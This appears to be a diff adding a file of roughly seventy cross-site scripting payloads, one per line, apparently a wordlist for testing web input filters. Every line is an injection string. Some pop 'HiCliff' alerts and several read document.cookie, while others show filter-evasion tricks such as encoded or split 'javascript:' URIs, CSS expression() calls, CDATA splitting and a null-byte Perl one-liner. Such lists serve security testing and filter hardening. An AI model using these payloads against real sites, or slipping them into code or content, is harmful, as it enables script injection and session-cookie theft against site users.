@@ -1,0 +1,70 @@
+%22onload%3D%22alert%28%22HiCliff%20%22%29%22 
+%3CDIV+STYLE%3D%22xss%3Aex%2F*XSS*%2Fpression%28alert%28%27HiCliff%27%29%
+';--"<HiCliff>=&{()} 
+[<]]>script<![CDATA[>]]>alert('HiCliff')<![CDATA[<]]>/script<![CDATA[>]]> 
+\";alert('HiCliff');// 
+</TITLE><SCRIPT>alert("hiCliff");</SCRIPT> 
+<<SCRIPT>alert("HiCliff");//<</SCRIPT> 
+?1">Hi Cliff!</a> 
+<a onmouseover="alert(0)">Cliff</a> 
+<a onmouseover=%22alert(0)%22>Cliff</a> 
+<a onmouseover=alert(0)>Cliff</a> 
+<a onmouseover="alert(document.cookie)">Cliff</a> 
+<a onmouseover="alert(document.cookie)">Hi Cliff</a> 
+<a onmouseover=alert(document.cookie)>Hi Cliff</a> 
+<BASE HREF="javascript:alert('HiCliff');//"> 
+<BGSOUND SRC="javascript:alert('HiCliff');"> 
+<BODY BACKGROUND="javascript:alert('HiCliff')"> 
+<BODY onload!#$%&()*~+?_.,:;?@[/|\]^`=alert("HiCliff")> 
+<BODY ONLOAD=alert('HiCliff')> 
+<BR SIZE="&{alert('HiCliff')}"> 
+<DIV onmouseover=alert(document.cookie);">Hi Cliff</div> 
+<DIV STYLE="background?image: url(&#1;javascript:alert('HiCliff'))"> 
+<DIV STYLE="background?image: url(javascript:alert('HiCliff'))"> 
+<DIV STYLE="background?image: url(javascript:alert('HiCliff'))"> 
+<DIV STYLE="width: expression(alert('HiCliff'));"> 
+<FRAMESET><FRAME SRC="javascript:alert('HiCliff');"></FRAMESET> 
+<FRAMESET><FRAME SRC=javascript:alert('HiCliff');"></FRAMESET> 
+<i/*xss*/frame src="https://crap.org" style="position:absolute;top:0px></i/*HiCliff*/frame> 
+<IFRAME SRC="javascript:alert('HiCliff');"></IFRAME> 
+<IMG """><SCRIPT>alert("HiCliff")</SCRIPT>"> 
+<IMG DYNSRC="javascript:alert('HiCliff')"> 
+<IMG LOWSRC="javascript:alert('HiCliff')"> 
+<IMG onmouseover="alert('HiCliff')"> 
+<IMG SRC= onmouseover="alert('HiCliff')"> 
+<IMG SRC=" &#14;  javascript:alert('HiCliff');"> 
+<IMG SRC="jav&#x09;ascript:alert('HiCliff');"> 
+<IMG SRC="jav&#x0A;ascript:alert('HiCliff');"> 
+<IMG SRC="jav&#x0D;ascript:alert('HiCliff');"> 
+<IMG SRC="javascript:alert('HiCliff');"> 
+<IMG SRC="javascript:alert('HiCliff')" 
+<IMG SRC=# onmouseover="alert('HiCliff')"> 
+<IMG SRC=`javascript:alert("Don?t forget to say, 'HiCliff'")`> 
+<IMG SRC=javascript:alert("HiCliff")> 
+<IMG SRC=javascript:alert('HiCliff')> 
+<IMG SRC=JaVaScRiPt:alert('HiCliff')> 
+<IMG SRC=JaVaScRiPt:alert('HiCliff')> 
+<IMG SRC='vbscript:msgbox("HiCliff")'> 
+<IMG STYLE="xss:expr/*XSS*/ession(alert('HiCliff'))"> 
+<INPUT TYPE="IMAGE" SRC="javascript:alert('HiCliff');"> 
+<LINK REL="stylesheet" HREF="javascript:alert('HiCliff');"> 
+<META HTTP?EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('HiCliff');"> 
+<META HTTP?EQUIV="refresh" CONTENT="0;url=javascript:alert('HiCliff');"> 
+<meta http?equiv="refresh" content="1; url=javascript:alert('HiCliff');"> 
+<script>alert("Cliff")</script> 
+<STYLE type="text/css">BODY{background:url("javascript:alert('HiCliff')")}</STYLE> 
+<STYLE type="text/css">BODY{background:url("javascript:alert('HiCliff')")}</STYLE> 
+<STYLE TYPE="text/javascript">alert('HiCliff');</STYLE> 
+<STYLE>.XSS{background?image:url("javascript:alert('HiCliff')");}</STYLE>
+<A CLASS=HiCliff></A> 
+<STYLE>@im\port'\ja\vasc\ript:alert("HiCliff")';</STYLE> 
+<STYLE>BODY{?moz?binding:url("http://127.0.0.1/xssmoz.xml#HiCliff")}</STYLE> 
+<STYLE>li {list?style?image:url("javascript:alert('HiCliff')");}</STYLE><UL><LI>XSS</br> 
+<TABLE BACKGROUND="javascript:alert('HiCliff')"> 
+<TABLE><TD BACKGROUND="javascript:alert('HiCliff')"> 
+<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('HiCliff')"></B></I></XML> 
+<XSS STYLE="xss:expression(alert('HiCliff'))"> 
+?script?alert(?HiCliff?)?/script? 
+echo('IPT>alert("HiCliff")</SCRIPT>'); ?> 
+perl ?e 'print "<IMG SRC=java\0script:alert(\"HiCliff\")>";' > out 
+xss:ex/*HiCliff*//*/*/pression(alert("HiCliff"))'> 
